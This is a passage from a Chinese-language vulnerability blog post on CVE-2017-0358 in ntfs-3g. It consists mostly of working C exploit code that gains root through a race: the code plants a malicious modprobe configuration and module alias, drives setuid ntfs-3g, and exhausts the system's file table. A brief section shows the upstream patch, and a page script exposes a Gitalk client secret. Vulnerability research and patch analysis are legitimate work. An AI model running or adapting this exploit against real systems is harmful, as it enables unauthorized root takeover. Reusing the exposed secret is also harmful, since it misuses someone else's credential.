err(<span class="number">1</span>, <span class="string">"mkdtemp"</span>);</span><br><span class="line"><span class="keyword">char</span> volume[<span class="number">100</span>], mountpoint[<span class="number">100</span>], modprobe_confdir[<span class="number">100</span>], modprobe_conffile[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(volume, <span class="string">"%s/volume"</span>, <span class="keyword">template</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(mountpoint, <span class="string">"%s/mountpoint"</span>, <span class="keyword">template</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(modprobe_confdir, <span class="string">"%s/modprobe.d"</span>, <span class="keyword">template</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(modprobe_conffile, <span class="string">"%s/sploit.conf"</span>, modprobe_confdir);</span><br><span class="line"><span class="keyword">if</span> (mkdir(volume, <span class="number">0777</span>) || mkdir(mountpoint, <span class="number">0777</span>) || mkdir(modprobe_confdir, <span class="number">0777</span>))</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"mkdir"</span>);</span><br><span class="line"><span class="keyword">int</span> conffd = open(modprobe_conffile, O_WRONLY|O_CREAT, <span class="number">0666</span>);</span><br><span class="line"><span class="keyword">if</span> (conffd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"open modprobe config"</span>);</span><br><span class="line"><span class="keyword">int</span> suidfile_fd = open(<span class="string">"rootshell"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (suidfile_fd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to open ./rootshell"</span>);</span><br><span class="line"><span class="keyword">char</span> modprobe_config[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(modprobe_config, <span class="string">"alias fuse rootmod\noptions rootmod suidfile_fd=%d\n"</span>, suidfile_fd);</span><br><span class="line"><span class="keyword">if</span> (write(conffd, modprobe_config, <span class="built_in">strlen</span>(modprobe_config)) != <span class="built_in">strlen</span>(modprobe_config))</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"modprobe config write failed"</span>);</span><br><span class="line">close(conffd);</span><br><span class="line"><span class="comment">// module directory setup</span></span><br><span class="line"><span class="keyword">char</span> system_cmd[<span class="number">1000</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(system_cmd, <span class="string">"mkdir -p %s/lib/modules/$(uname -r) &amp;&amp; cp rootmod.ko *.bin %s/lib/modules/$(uname -r)/"</span>,</span><br><span class="line">    <span class="keyword">template</span>, <span class="keyword">template</span>);</span><br><span class="line"><span class="keyword">if</span> (system(system_cmd))</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"shell command failed"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set up inotify watch for /proc/mounts.</span></span><br><span class="line"><span class="comment">// Note: /proc/mounts is a symlink to /proc/self/mounts, so</span></span><br><span class="line"><span class="comment">// the watch will only see accesses by this process.</span></span><br><span class="line"><span class="keyword">int</span> inotify_fd = inotify_init1(IN_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (inotify_fd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to create inotify fd?"</span>);</span><br><span class="line"><span class="keyword">if</span> (inotify_add_watch(inotify_fd, <span class="string">"/proc/mounts"</span>, IN_OPEN) == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to watch /proc/mounts"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set up inotify watch for /proc/filesystems.</span></span><br><span class="line"><span class="comment">// This can be used to detect whether we lost the race.</span></span><br><span class="line"><span class="keyword">int</span> fs_inotify_fd = inotify_init1(IN_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (fs_inotify_fd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to create inotify fd?"</span>);</span><br><span class="line"><span class="keyword">if</span> (inotify_add_watch(fs_inotify_fd, <span class="string">"/proc/filesystems"</span>, IN_OPEN) == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to watch /proc/filesystems"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set up inotify watch for /sbin/modprobe.</span></span><br><span class="line"><span class="comment">// This can be used to detect when we can release all our open files.</span></span><br><span class="line"><span class="keyword">int</span> modprobe_inotify_fd = inotify_init1(IN_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (modprobe_inotify_fd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to create inotify fd?"</span>);</span><br><span class="line"><span class="keyword">if</span> (inotify_add_watch(modprobe_inotify_fd, <span class="string">"/sbin/modprobe"</span>, IN_OPEN) == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to watch /sbin/modprobe"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> do_exec_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> (pipe2(do_exec_pipe, O_CLOEXEC))</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"pipe"</span>);</span><br><span class="line"><span class="keyword">pid_t</span> child = fork();</span><br><span class="line"><span class="keyword">if</span> (child == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"fork"</span>);</span><br><span class="line"><span class="keyword">if</span> (child != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (read(do_exec_pipe[<span class="number">0</span>], buf, <span class="number">1</span>) != <span class="number">1</span>)</span><br><span class="line">        errx(<span class="number">1</span>, <span class="string">"pipe read failed"</span>);</span><br><span class="line">    <span class="keyword">char</span> modprobe_opts[<span class="number">300</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(modprobe_opts, <span class="string">"-C %s -d %s"</span>, modprobe_confdir, <span class="keyword">template</span>);</span><br><span class="line">    setenv(<span class="string">"MODPROBE_OPTIONS"</span>, modprobe_opts, <span class="number">1</span>);</span><br><span class="line">    execlp(<span class="string">"ntfs-3g"</span>, <span class="string">"ntfs-3g"</span>, volume, mountpoint, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">child = getpid();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now launch ntfs-3g and wait until it opens /proc/mounts</span></span><br><span class="line"><span class="keyword">if</span> (write(do_exec_pipe[<span class="number">1</span>], buf, <span class="number">1</span>) != <span class="number">1</span>)</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"pipe write failed"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (read(inotify_fd, buf, <span class="keyword">sizeof</span>(buf)) &lt;= <span class="number">0</span>)</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"inotify read failed"</span>);</span><br><span class="line"><span class="keyword">if</span> (kill(getppid(), SIGSTOP))</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"can't stop setuid parent"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check whether we won the main race.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">poll_fds</span>[1] = &#123;</span>&#123;</span><br><span class="line">    .fd = fs_inotify_fd,</span><br><span class="line">    .events = POLLIN</span><br><span class="line">&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span> poll_res = poll(poll_fds, <span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">if</span> (poll_res == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"poll"</span>);</span><br><span class="line"><span class="keyword">if</span> (poll_res == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"looks like we lost the race"</span>);</span><br><span class="line">    <span class="keyword">if</span> (kill(getppid(), SIGKILL))</span><br><span class="line">        perror(<span class="string">"SIGKILL after lost race"</span>);</span><br><span class="line">    <span class="keyword">char</span> rm_cmd[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(rm_cmd, <span class="string">"rm -rf %s"</span>, <span class="keyword">template</span>);</span><br><span class="line">    system(rm_cmd);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"looks like we won the race"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open as many files as possible. Whenever we have</span></span><br><span class="line"><span class="comment">// a bunch of open files, move them into a new process.</span></span><br><span class="line"><span class="keyword">int</span> total_open_files = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> LIMIT 500</span></span><br><span class="line">    <span class="keyword">int</span> open_files[LIMIT];</span><br><span class="line">    <span class="keyword">bool</span> reached_limit = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> n_open_files;</span><br><span class="line">    <span class="keyword">for</span> (n_open_files = <span class="number">0</span>; n_open_files &lt; LIMIT; n_open_files++) &#123;</span><br><span class="line">        open_files[n_open_files] = eventfd(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (open_files[n_open_files] == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno != ENFILE)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">"eventfd() failed"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"got ENFILE at %d total\n"</span>, total_open_files);</span><br><span class="line">            reached_limit = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        total_open_files++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pid_t</span> fd_stasher_child = fork();</span><br><span class="line">    <span class="keyword">if</span> (fd_stasher_child == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">"fork (for eventfd holder)"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd_stasher_child == <span class="number">0</span>) &#123;</span><br><span class="line">        prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">        <span class="comment">// close PR_SET_PDEATHSIG race window</span></span><br><span class="line">        <span class="keyword">if</span> (getppid() != child) raise(SIGKILL);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) pause();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n_open_files; i++)</span><br><span class="line">        close(open_files[i]);</span><br><span class="line">    <span class="keyword">if</span> (reached_limit)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wake up ntfs-3g and keep allocating files, then free up</span></span><br><span class="line"><span class="comment">// the files as soon as we're reasonably certain that either</span></span><br><span class="line"><span class="comment">// modprobe was spawned or the attack failed.</span></span><br><span class="line"><span class="keyword">if</span> (kill(getppid(), SIGCONT))</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"SIGCONT"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">time_t</span> start_time = time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">1000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> efd = eventfd(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (efd == <span class="number">-1</span> &amp;&amp; errno != ENFILE)</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">"gapfiller eventfd() failed unexpectedly"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">modprobe_poll_fds</span>[1] = &#123;</span>&#123;</span><br><span class="line">        .fd = modprobe_inotify_fd,</span><br><span class="line">        .events = POLLIN</span><br><span class="line">    &#125;&#125;;</span><br><span class="line">    <span class="keyword">int</span> modprobe_poll_res = poll(modprobe_poll_fds, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (modprobe_poll_res == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">"poll"</span>);</span><br><span class="line">    <span class="keyword">if</span> (modprobe_poll_res == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"yay, modprobe ran!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (time(<span class="literal">NULL</span>) &gt; start_time + <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"modprobe didn't run?"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-补丁代码，load-fuse-module-函数"><a href="#0x04-补丁代码，load-fuse-module-函数" class="headerlink" title="0x04 补丁代码，load_fuse_module()函数"></a>0x04 补丁代码，<code>load_fuse_module()</code>函数</h2><hr>
<p><a href="http://seclists.org/oss-sec/2017/q1/307" target="_blank" rel="noopener">http://seclists.org/oss-sec/2017/q1/307</a></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *cmd = <span class="string">"/sbin/modprobe"</span>;</span><br><span class="line">+   <span class="keyword">char</span> *env = (<span class="keyword">char</span>*)<span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">req</span> = &#123;</span> <span class="number">0</span>, <span class="number">100000000</span> &#125;;  <span class="comment">/* 100 msec */</span></span><br><span class="line">    fuse_fstype fstype;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stat(cmd, &amp;st) &amp;&amp; !geteuid()) &#123;</span><br><span class="line">            pid = fork();</span><br><span class="line">            <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">-                  execl(cmd, cmd, <span class="string">"fuse"</span>, <span class="literal">NULL</span>);</span><br><span class="line">+                  execle(cmd, cmd, <span class="string">"fuse"</span>, <span class="literal">NULL</span>, &amp;env);</span><br><span class="line">                    _exit(<span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">-1</span>)</span><br><span class="line">                    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
</div><iframe src="/donate/?AliPayQR=null&amp;WeChatQR=/img/qr.jpeg&amp;GitHub=https://github.com/Ma3k4H3d&amp;BTCQR=null&amp;BTCKEY=null&amp;PayPal=null" style="overflow-x:hidden; overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Mr.Ma3k4H3d</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="/2018/10/21/CVE-2017-0358/">http://maskhed.github.io/2018/10/21/CVE-2017-0358/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章均为原创，采用 CC BY-NC-SA 4.0 CN。转载请注明出处！</li></ul></div><br><div class="tags"><a href="/tags/CVE/">CVE</a></div><div class="post-nav"><a class="pre" href="/2018/10/21/Hexo博客搭建/">Hexo 搭建个人博客</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=0.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=0.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=0.0.0"></script><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script><script>var gitalk = new Gitalk({
  clientID: '5a30c862e87dbcdd2992',
  clientSecret: 'e098ba3d824802e68648008f80b024617bd8a546',
  repo: 'ma3k4h3d.github.io',
  owner: 'Ma3k4H3d',
  admin: ['Ma3k4H3d'],
  distractionFreeMode: false
})
gitalk.render('container')
</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AEG/">AEG</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Angr/">Angr</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/技术分享/">技术分享</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔杂谈/">随笔杂谈</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/CGC/" style="font-size: 15px;">CGC</a> <a href="/tags/CVE/" style="font-size: 15px;">CVE</a> <a href="/tags/Mr-Robot/" style="font-size: 15px;">Mr.Robot</a> <a href="/tags/SS/" style="font-size: 15px;">SS</a> <a href="/tags/Hexo/" style="font-size: 15px;">Hexo</a> <a href="/tags/Github/" style="font-size: 15px;">Github</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/12/08/风雨兼程/">即使风雨兼程，也能守得云开见月明</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/29/AEG-papers/">AEG Papers</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/29/OSVDB-16373-glFTPd/">OSVDB-ID#16373（glFTPd）栈溢出漏洞分析与复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/28/rex-1/">Exploit 自动生成引擎 Rex</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/CVE-2004-2093/">CVE-2004-2093(rsync)缓冲区溢出漏洞分析与复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/15/CVE-2001-1413/">CVE-2001-1413(nCompress) 缓冲区溢出漏洞分析及复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/14/CVE-2003-0947/">CVE-2003-0947(iwconfig)缓冲区溢出分析及复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/23/rex-crash/">Rex：源码分析 -- Crash Analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/17/Rex-stacksmash/">Rex AEG：栈溢出之 Exploit 自动生成</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/09/insomnihack-aeg/">angr AEG：缓冲区溢出之 Exploit 自动生成</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a><ul></ul><a href="http://riusksk.me" title="riusksk" target="_blank">riusksk</a><ul></ul><a href="https://micropoor.blogspot.com" title="Micropoor" target="_blank">Micropoor</a><ul></ul><a href="http://www.cnblogs.com/backlion" title="Backlion" target="_blank">Backlion</a><ul></ul><a href="https://onebugman.com" title="OneBugMan" target="_blank">OneBugMan</a><ul></ul><a href="http://yama0xff.com" title="yama0xff.com" target="_blank">yama0xff.com</a><ul></ul><a href="https://musicforprogramming.net" title="musicforprogramming.net" target="_blank">musicforprogramming.net</a><ul></ul><a href="https://book.douban.com/annual/2018?source=navigation" title="好书精选" target="_blank">好书精选</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer"><div>Total<span id="busuanzi_container_site_pv"><span> </span><span id="busuanzi_value_site_pv"></span></span><span rel="nofollow">  hits, </span><span id="busuanzi_container_site_uv"><span id="busuanzi_value_site_uv"></span></span><span rel="nofollow">  visitors. </span></div><div><script>var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1275288791'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1275288791%26online%3D1%26show%3Dline' type='text/javascript'%3E%3C/script%3E"));</script></div>Copyright © 2019 <a href="/." rel="nofollow">Mr.Ma3k4H3d.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" color="208,55,66" opacity="0.3" zindex="-1" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>